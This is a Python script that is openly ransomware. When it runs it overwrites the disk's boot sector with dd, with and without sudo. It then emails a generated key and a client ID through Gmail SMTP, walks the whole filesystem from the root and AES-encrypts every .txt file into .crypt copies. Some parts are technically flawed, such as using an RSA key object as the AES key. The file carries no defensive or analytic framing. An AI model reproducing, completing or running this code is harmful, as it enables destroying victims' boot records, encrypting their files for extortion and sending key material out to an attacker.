import os
import sys
import random
import struct
import smtplib
import string
import datetime
import mechanize

import getpass as gp

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from multiprocessing import Pool

def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

SMTP = True
ID = gen_client_ID(12)

try:
    os.system("dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
except:
    pass			
try:
    os.system("sudo dd if=boot.bin of=/dev/hda bs=512 count=1 && exit")
except:
    pass


def send_Key_SMTP():
	ts = datetime.datetime.now()
	SERVER = "smtp.gmail.com" 		
	PORT = 587 						
	USER= "user@gmail.com" 
	PASS= "password"
	FROM = USER
	TO = ["address@gmail.com"] 		
	SUBJECT = "Ransomware data: "+str(ts)
	MESSAGE = """\Client ID: %s Decryption Key: %s """ % (ID, exKey)
	message = """\ From: %s To: %s Subject: %s %s """ % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
	try:              
		server = smtplib.SMTP()
		server.connect(SERVER, PORT)
		server.starttls()
		server.login(USER, PASS)
		server.sendmail(FROM, TO, message)
		server.quit()
	except Exception as e:
		pass



def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):

    if not out_filename:
        out_filename = in_filename + '.crypt'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
				
				

def single_arg_encrypt_file(in_filename):
    encrypt_file(key, in_filename)

def select_files():
    
    ext = '.txt'
           
    files_to_enc = []
    for root, dirs, files in os.walk("/"):
        for file in files:
            if file.endswith(ext):
                files_to_enc.append(os.path.join(root, file))

    # Parallelize execution of encryption function over four subprocesses
    pool = Pool(processes=4)
    pool.map(single_arg_encrypt_file, files_to_enc)

	
if __name__=="__main__":
	if SMTP == True:
		key = RSA.generate(2048)
		exKey = key.exportKey('PEM')
		send_Key_SMTP()
		
	select_files()
